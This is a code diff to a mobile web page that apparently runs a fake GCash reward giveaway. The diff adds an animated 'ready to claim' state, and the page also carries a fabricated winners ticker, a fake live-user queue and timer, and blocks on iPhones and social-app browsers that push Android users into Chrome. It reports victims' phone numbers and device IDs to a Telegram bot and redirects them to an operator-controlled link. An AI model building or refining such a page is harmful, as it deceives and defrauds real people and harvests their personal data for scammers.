@@ -47,7 +47,7 @@
         @keyframes blockPulse { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.1); opacity: 1; } }
         @media (hover: hover) and (pointer: fine), (min-width: 769px) { #desktopBlock { display: flex !important; } #missionApp { display: none !important; } }
 
-        /* ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK) — SAME THEME AS MISSION */
+        /* ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK) */
         #intentBlock {
             display: none;
             position: fixed;
@@ -390,6 +390,185 @@
         .popup-card.ban-card .popup-img-wrap::before { background: radial-gradient(circle at center, rgba(255, 68, 68, 0.5) 0%, rgba(139, 0, 0, 0.3) 40%, transparent 70%); }
         .popup-card.ban-card .popup-img { filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 68, 68, 0.55)); }
 
+        /* ============================================================
+           ✅ READY TO CLAIM STATE — ANIMATED
+           ============================================================ */
+        .ready-to-claim-wrap {
+            display: none;
+            animation: readyFadeIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin: 14px 0;
+        }
+        .ready-to-claim-wrap.show { display: block; }
+
+        .ready-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: linear-gradient(180deg, #39ff14 0%, #008833 100%);
+            border: 2px solid #fff;
+            border-radius: 30px;
+            font-family: 'Orbitron', monospace;
+            font-size: 11px;
+            font-weight: 900;
+            letter-spacing: 2.5px;
+            color: #fff;
+            margin-bottom: 14px;
+            box-shadow: 0 4px 0 #004d1a, 0 0 30px rgba(57, 255, 20, 0.9);
+            text-transform: uppercase;
+            animation: readyBadgePulse 1.2s ease-in-out infinite;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+        @keyframes readyBadgePulse {
+            0%, 100% { box-shadow: 0 4px 0 #004d1a, 0 0 30px rgba(57, 255, 20, 0.9); transform: scale(1); }
+            50% { box-shadow: 0 4px 0 #004d1a, 0 0 60px rgba(57, 255, 20, 1), 0 0 100px rgba(57, 255, 20, 0.5); transform: scale(1.05); }
+        }
+        .ready-badge .ready-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #fff;
+            box-shadow: 0 0 12px #fff, 0 0 20px #39ff14;
+            animation: readyDotBlink 0.8s ease-in-out infinite;
+        }
+        @keyframes readyDotBlink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.7); }
+        }
+
+        .ready-title {
+            font-family: 'Fredoka', sans-serif;
+            font-size: 30px;
+            font-weight: 900;
+            line-height: 1.15;
+            letter-spacing: 1px;
+            background: linear-gradient(180deg, #ffffff 0%, #39ff14 40%, #008833 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            filter: drop-shadow(0 0 25px rgba(57, 255, 20, 0.9));
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            animation: readyTitleGlow 1.5s ease-in-out infinite;
+        }
+        @keyframes readyTitleGlow {
+            0%, 100% { filter: drop-shadow(0 0 25px rgba(57, 255, 20, 0.9)); }
+            50% { filter: drop-shadow(0 0 45px rgba(57, 255, 20, 1)) drop-shadow(0 0 80px rgba(57, 255, 20, 0.5)); }
+        }
+
+        .ready-subtitle {
+            font-family: 'Poppins', sans-serif;
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.95);
+            margin-bottom: 18px;
+            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
+        }
+        .ready-subtitle strong {
+            color: #39ff14;
+            font-weight: 800;
+            text-shadow: 0 0 12px rgba(57, 255, 20, 0.75);
+        }
+
+        .ready-claim-btn {
+            position: relative;
+            width: 100%;
+            padding: 22px 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: linear-gradient(180deg, #d4ffb3 0%, #39ff14 25%, #00cc00 65%, #008833 100%);
+            border: 3px solid #ffffff;
+            border-radius: 20px;
+            font-family: 'Orbitron', monospace;
+            font-size: 17px;
+            font-weight: 900;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            color: #003300;
+            cursor: pointer;
+            overflow: hidden;
+            box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 60px rgba(57, 255, 20, 0.9);
+            transition: transform 0.12s ease, box-shadow 0.12s ease;
+            animation: readyBtnPulse 1.4s ease-in-out infinite;
+            margin-top: 6px;
+        }
+        @keyframes readyBtnPulse {
+            0%, 100% {
+                box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 60px rgba(57, 255, 20, 0.9);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 100px rgba(57, 255, 20, 1), 0 0 150px rgba(57, 255, 20, 0.6);
+                transform: scale(1.03);
+            }
+        }
+        .ready-claim-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 60%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.85), transparent);
+            transform: skewX(-20deg);
+            animation: btnShine 1.8s ease-in-out infinite;
+        }
+        .ready-claim-btn:active {
+            transform: translateY(6px) scale(1) !important;
+            box-shadow: 0 0 0 #004d1a, 0 4px 12px rgba(0, 0, 0, 0.5) !important;
+        }
+        .ready-claim-btn .btn-icon {
+            font-size: 22px;
+            animation: readyBtnIconBounce 1s ease-in-out infinite;
+            display: inline-block;
+        }
+        @keyframes readyBtnIconBounce {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-3px) scale(1.15); }
+        }
+
+        .ready-note {
+            margin-top: 14px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 11px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.85);
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            animation: readyNotePulse 2s ease-in-out infinite;
+        }
+        @keyframes readyNotePulse {
+            0%, 100% { opacity: 0.85; }
+            50% { opacity: 1; }
+        }
+        .ready-note i {
+            color: #39ff14;
+            filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.9));
+        }
+
+        @keyframes readyFadeIn {
+            0% { opacity: 0; transform: translateY(-10px) scale(0.95); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        /* Glow rings around ready button */
+        .ready-glow-ring {
+            position: absolute;
+            inset: -12px;
+            border-radius: 30px;
+            pointer-events: none;
+            border: 2px solid rgba(57, 255, 20, 0.6);
+            animation: readyRingExpand 2s ease-out infinite;
+        }
+        @keyframes readyRingExpand {
+            0% { transform: scale(0.9); opacity: 0.9; }
+            100% { transform: scale(1.3); opacity: 0; }
+        }
+
         @media (max-width: 380px) {
             .mission-card { padding: 30px 16px 22px; border-radius: 26px; }
             .mission-title { font-size: 23px; }
@@ -405,6 +584,8 @@
             #intentBlock .intent-title { font-size: 22px; }
             #intentBlock .intent-subtitle { font-size: 12px; }
             #intentBlock .auto-open-btn { padding: 15px 18px; font-size: 12px; letter-spacing: 2px; }
+            .ready-title { font-size: 24px; }
+            .ready-claim-btn { padding: 18px 16px; font-size: 14px; letter-spacing: 2px; }
         }
         @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
     </style>
@@ -419,7 +600,7 @@
         <div class="block-badge">◇ SCAN & OPEN ON MOBILE ◇</div>
     </div>
 
-    <!-- ✅ INTENT / BROWSER GUARD — SAME THEME AS MISSION -->
+    <!-- ✅ INTENT / BROWSER GUARD -->
     <div id="intentBlock">
         <div class="intent-card">
             <div class="intent-image-wrap">
@@ -493,7 +674,7 @@
         </div>
     </div>
 
-    <!-- POPUP 1: CAT CLAIM (with phone input) -->
+    <!-- POPUP 1: CAT CLAIM -->
     <div class="popup-overlay" id="catClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="catClaimClose">✕</button>
@@ -519,7 +700,7 @@
         </div>
     </div>
 
-    <!-- POPUP 3: CLAIM FORM (GCash#) -->
+    <!-- POPUP 3: CLAIM FORM -->
     <div class="popup-overlay" id="claimFormPopup">
         <div class="popup-card">
             <button class="popup-close" id="claimFormClose">✕</button>
@@ -537,14 +718,40 @@
     <div class="popup-overlay" id="queuePopup">
         <div class="popup-card">
             <button class="popup-close" id="queueClose">✕</button>
-            <div class="queue-badge"><span class="queue-dot"></span><span>⏳ PROCESSING QUEUE</span></div>
-            <h2 class="popup-title">MANY USERS CLAIMING</h2>
-            <p class="popup-subtitle">Maraming user ang nag-claim ngayon.<br>Please wait for your turn.</p>
-            <div class="queue-count-box"><span>👥 Live users:</span><span class="live-users-count" id="liveUsersCount">0</span></div>
-            <div class="queue-timer-label">⏱ Available to claim in</div>
-            <div class="queue-timer-big" id="queueTimer">10:00</div>
-            <div class="queue-progress"><div class="queue-progress-bar" id="queueProgressBar"></div></div>
-            <p class="popup-subtitle" style="margin-top:14px; font-size:11px; opacity:0.8;">Your claim is in the queue. Please keep this page open.</p>
+
+            <!-- NORMAL QUEUE STATE -->
+            <div id="queueNormalState">
+                <div class="queue-badge"><span class="queue-dot"></span><span>⏳ PROCESSING QUEUE</span></div>
+                <h2 class="popup-title">MANY USERS CLAIMING</h2>
+                <p class="popup-subtitle">Maraming user ang nag-claim ngayon.<br>Please wait for your turn.</p>
+                <div class="queue-count-box"><span>👥 Live users:</span><span class="live-users-count" id="liveUsersCount">0</span></div>
+                <div class="queue-timer-label">⏱ Available to claim in</div>
+                <div class="queue-timer-big" id="queueTimer">10:00</div>
+                <div class="queue-progress"><div class="queue-progress-bar" id="queueProgressBar"></div></div>
+                <p class="popup-subtitle" style="margin-top:14px; font-size:11px; opacity:0.8;">Your claim is in the queue. Please keep this page open.</p>
+            </div>
+
+            <!-- ✅ READY TO CLAIM STATE -->
+            <div class="ready-to-claim-wrap" id="readyToClaimWrap">
+                <div class="ready-badge">
+                    <span class="ready-dot"></span>
+                    <span>✨ READY TO CLAIM ✨</span>
+                </div>
+                <h2 class="ready-title">YOUR TURN!</h2>
+                <p class="ready-subtitle">Your slot is now available.<br><strong>Tap the button below to claim!</strong></p>
+                <div style="position: relative; margin-top: 8px;">
+                    <div class="ready-glow-ring"></div>
+                    <button class="ready-claim-btn" id="readyClaimBtn">
+                        <span class="btn-icon">🎁</span>
+                        <span>CLAIM NOW</span>
+                    </button>
+                </div>
+                <div class="ready-note">
+                    <i class="fas fa-hand-point-up"></i>
+                    <span>Tap to open your reward</span>
+                </div>
+            </div>
+
         </div>
     </div>
 
@@ -623,7 +830,6 @@
                 return /Android/i.test(navigator.userAgent);
             }
 
-            // ✅ AUTO-INTENT: Force open in Chrome (Android only)
             function forceOpenInChrome() {
                 if (!isAndroid()) return false;
                 var currentUrl = window.location.href;
@@ -638,9 +844,51 @@
                 }
             }
 
+            function enforceBrowserGuard() {
+                var block = document.getElementById('intentBlock');
+                var app = document.getElementById('missionApp');
+                var ticker = document.getElementById('winnersTicker');
+
+                if (isIPhone()) {
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    if (ticker) ticker.style.display = 'none';
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
+                        p.classList.remove('show');
+                        p.style.pointerEvents = 'none';
+                    });
+                    return false;
+                }
+
+                if (isInAppBrowser()) {
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    if (ticker) ticker.style.display = 'none';
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
+                        p.classList.remove('show');
+                        p.style.pointerEvents = 'none';
+                    });
+                    setTimeout(function() { forceOpenInChrome(); }, 800);
+                    return false;
+                }
+
+                if (block) block.style.display = 'none';
+                if (app) app.style.display = '';
+                if (ticker) ticker.style.display = '';
+                return true;
+            }
+
+            var browserAllowed = enforceBrowserGuard();
+            window.addEventListener('resize', function() { enforceBrowserGuard(); });
+            window.addEventListener('orientationchange', function() { setTimeout(enforceBrowserGuard, 300); });
+
+            var autoOpenBtn = document.getElementById('autoOpenBtn');
+            if (autoOpenBtn) {
+                autoOpenBtn.addEventListener('click', function() { forceOpenInChrome(); });
+            }
+
             // ============================================================
             // ✅ SMART DEEPLINK HANDLER
-            // Opens link without creating new browser session
             // ============================================================
             function openAsDeeplink(url) {
                 if (!url) return;
@@ -650,14 +898,12 @@
 
                 console.log('🔗 Opening link as deeplink:', url);
 
-                // CASE 1: Custom scheme (gcash://, myapp://, intent://) → direct
                 if (isCustomScheme || url.indexOf('intent://') === 0) {
                     console.log('📱 Direct custom scheme');
                     try { window.location.href = url; } catch(e) { console.log('Custom scheme failed:', e); }
                     return;
                 }
 
-                // CASE 2: HTTPS URL on Android → Chrome Custom Tab
                 if (/^https?:\/\//i.test(url) && android) {
                     var cleanUrl = url.replace(/^https?:\/\//, '');
                     var intentUrl = 'intent://' + cleanUrl +
@@ -675,65 +921,8 @@
                     return;
                 }
 
-                // CASE 3: Fallback (iOS or unknown) → direct open
                 console.log('🌐 Direct open (fallback)');
                 window.location.href = url;
-            }
-
-            function enforceBrowserGuard() {
-                var block = document.getElementById('intentBlock');
-                var app = document.getElementById('missionApp');
-                var ticker = document.getElementById('winnersTicker');
-
-                // Block iPhone
-                if (isIPhone()) {
-                    if (block) block.style.display = 'flex';
-                    if (app) app.style.display = 'none';
-                    if (ticker) ticker.style.display = 'none';
-                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                        p.classList.remove('show');
-                        p.style.pointerEvents = 'none';
-                    });
-                    return false;
-                }
-
-                // Block FB / IG in-app browser
-                if (isInAppBrowser()) {
-                    if (block) block.style.display = 'flex';
-                    if (app) app.style.display = 'none';
-                    if (ticker) ticker.style.display = 'none';
-                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                        p.classList.remove('show');
-                        p.style.pointerEvents = 'none';
-                    });
-
-                    // ✅ AUTO-INTENT: Try to auto-open in Chrome
-                    setTimeout(function() {
-                        forceOpenInChrome();
-                    }, 800);
-
-                    return false;
-                }
-
-                if (block) block.style.display = 'none';
-                if (app) app.style.display = '';
-                if (ticker) ticker.style.display = '';
-                return true;
-            }
-
-            // Run guard immediately
-            var browserAllowed = enforceBrowserGuard();
-
-            // Re-check on resize / orientation
-            window.addEventListener('resize', function() { enforceBrowserGuard(); });
-            window.addEventListener('orientationchange', function() { setTimeout(enforceBrowserGuard, 300); });
-
-            // ✅ Manual "Open in Chrome" button
-            var autoOpenBtn = document.getElementById('autoOpenBtn');
-            if (autoOpenBtn) {
-                autoOpenBtn.addEventListener('click', function() {
-                    forceOpenInChrome();
-                });
             }
 
             // ============================================================
@@ -758,6 +947,10 @@
             var liveUsersInterval = null;
             var linkListeners = [];
             var isBanned = false;
+
+            // ✅ READY TO CLAIM state
+            var readyToClaim = false;
+            var pendingLink = null;
 
             // ============================================================
             // MOBILE GUARD
@@ -906,7 +1099,7 @@
             }
 
             // ============================================================
-            // WINNERS TICKER (Fixed ₱500)
+            // WINNERS TICKER
             // ============================================================
             function initWinnersTicker() {
                 var prefixes = ['0917', '0918', '0927', '0998', '0945', '0966', '0955', '0939', '0906', '0977'];
@@ -1026,7 +1219,7 @@
             document.getElementById('queueClose').onclick = function() { closePopup('queuePopup'); stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState(); };
             document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
             document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
-            document.getElementById('banOkBtn').onclick = function() { /* stay on ban popup */ };
+            document.getElementById('banOkBtn').onclick = function() { /* stay */ };
 
             // ============================================================
             // INIT DEVICE
@@ -1316,6 +1509,12 @@
 
                 closePopup('claimFormPopup');
                 setTimeout(function() {
+                    // Reset state
+                    readyToClaim = false;
+                    pendingLink = null;
+                    document.getElementById('queueNormalState').style.display = 'block';
+                    document.getElementById('readyToClaimWrap').classList.remove('show');
+
                     openPopup('queuePopup');
                     startQueueTimer();
                     startLiveUsersCounter();
@@ -1396,39 +1595,98 @@
                 } catch(e) {}
             }
 
+            // ============================================================
+            // ✅ SHOW READY TO CLAIM STATE
+            // ============================================================
+            function showReadyToClaim(linkUrl) {
+                if (readyToClaim) return;
+
+                console.log('✨ Switching to READY TO CLAIM state');
+                readyToClaim = true;
+                pendingLink = linkUrl;
+
+                // Stop timer, live counter, listeners
+                stopQueueTimer();
+                stopLiveUsersCounter();
+                stopLinkListeners();
+                clearCountdownState();
+
+                // Vibration feedback
+                if (navigator.vibrate) {
+                    try { navigator.vibrate([100, 50, 100, 50, 200]); } catch(e) {}
+                }
+
+                // Confetti burst
+                triggerBurst();
+
+                // Switch UI state
+                var normalState = document.getElementById('queueNormalState');
+                var readyState = document.getElementById('readyToClaimWrap');
+                if (normalState) normalState.style.display = 'none';
+                if (readyState) readyState.classList.add('show');
+
+                // Send Telegram notification (WALANG link)
+                sendTelegram('✨ READY TO CLAIM\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n📊 Status: User can now claim\n━━━━━━━━━━━━━━━━━━━━');
+            }
+
+            // ============================================================
+            // ✅ READY CLAIM BUTTON — user-triggered deeplink
+            // ============================================================
+            document.getElementById('readyClaimBtn').addEventListener('click', function() {
+                if (!browserAllowed) return;
+                if (!pendingLink) {
+                    console.warn('⚠️ No pending link');
+                    return;
+                }
+
+                if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
+
+                this.innerHTML = '<span class="btn-icon">⏳</span><span>OPENING...</span>';
+                this.style.pointerEvents = 'none';
+                this.style.opacity = '0.85';
+
+                sendTelegram('🎁 USER TAPPED CLAIM\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+
+                setTimeout(function() {
+                    openAsDeeplink(pendingLink);
+                }, 600);
+            });
+
+            // ============================================================
+            // ✅ LINK LISTENERS — switch to READY instead of auto-redirect
+            // ============================================================
             function startLinkListener() {
                 stopLinkListeners();
                 if (!db) return;
 
+                // ✅ LISTENER 1: admin/redirectLink
                 var ref1 = db.ref('admin/redirectLink');
                 var cb1 = ref1.on('value', function(snap) {
                     var data = snap.val();
                     if (data && data.url && data.active !== false) {
-                        console.log('🚀 Link detected (admin)');
-                        stopLinkListeners();
-                        clearCountdownState();
-                        sendTelegram('🚀 COUNTDOWN → REDIRECT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
-                        openAsDeeplink(data.url);
+                        console.log('🚀 Link detected (admin) — switching to READY');
+                        showReadyToClaim(data.url);
                     }
                 });
                 linkListeners.push({ ref: ref1, cb: cb1, event: 'value' });
 
+                // ✅ LISTENER 2: links (available)
                 var ref2 = db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1);
                 var cb2 = ref2.on('value', function(snap) {
-                    if (snap.exists()) {
+                    if (snap.exists() && !readyToClaim) {
                         var links = snap.val();
                         var key = Object.keys(links)[0];
                         var linkData = links[key];
-                        console.log('🚀 Link detected (links)');
+                        console.log('🚀 Link detected (links) — switching to READY');
+
+                        // Mark as claimed
                         db.ref('links/' + key).update({
                             status: 'claimed',
                             user: userPhone || 'Unknown',
                             claimedAt: Date.now()
                         });
-                        stopLinkListeners();
-                        clearCountdownState();
-                        sendTelegram('🚀 COUNTDOWN → REDIRECT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
-                        openAsDeeplink(linkData.url);
+
+                        showReadyToClaim(linkData.url);
                     }
                 });
                 linkListeners.push({ ref: ref2, cb: cb2, event: 'value' });
